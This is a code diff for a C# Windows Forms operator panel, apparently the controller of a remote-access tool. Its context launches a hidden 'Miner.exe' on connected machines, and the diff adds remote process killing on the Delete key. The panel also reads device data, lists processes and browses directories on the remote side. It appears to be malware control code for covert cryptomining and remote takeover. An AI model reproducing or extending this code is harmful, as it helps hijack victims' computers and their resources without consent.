@@ -62,7 +62,17 @@ namespace ServerWorker
 
         private void button2_Click(object sender, EventArgs e)
         {
-            DrawInfoDevice(user.UsersCom.GetInfoDevice());
+            try
+            {
+                DrawInfoDevice(user.UsersCom.GetInfoDevice());
+
+                if (userData.id != "")
+                    userData.SaveDataToFile(userData.id + ".xml");
+            }
+            catch (Exception ex)
+            {
+                MessageBox.Show(ex.Message);
+            }
         }
 
         private void DrawInfoDevice(IInfoDevice infoDevice)
@@ -138,27 +148,6 @@ namespace ServerWorker
             user.UsersCom.RunHideProgram(@"Data\Miner.exe");
         }
 
-        private void button5_Click(object sender, EventArgs e)
-        {
-            user.UsersCom.DownloadUpdate();
-        }
-
-        private void button6_Click(object sender, EventArgs e)
-        {
-            if (userData.id != "")
-                userData.SaveDataToFile(userData.id + ".xml");
-        }
-
-        private void button7_Click(object sender, EventArgs e)
-        {
-            try
-            {
-                user.UsersCom.Reconnect();
-            } catch (Exception ex)
-            {
-                MessageBox.Show(ex.Message);
-            }
-        }
 
         private void button8_Click(object sender, EventArgs e)
         {
@@ -184,6 +173,28 @@ namespace ServerWorker
         {
             DirectoryViewForm directoryViewForm = new DirectoryViewForm(user);
             directoryViewForm.Show();
+        }
+
+        private void KillProc(string procName)
+        {
+            user.UsersCom.KillProcess(procName);
+        }
+
+        private void listBox2_KeyDown(object sender, KeyEventArgs e)
+        {
+            if (e.KeyCode == Keys.Delete)
+            {
+                try
+                {
+                    KillProc(listBox2.SelectedItem.ToString());
+                    listBox2.Items.Clear();
+                    listBox2.Items.AddRange(user.UsersCom.GetListProc().ToArray());
+                }
+                catch (Exception ex)
+                {
+                    MessageBox.Show(ex.Message);
+                }
+            }
         }
     }
 }
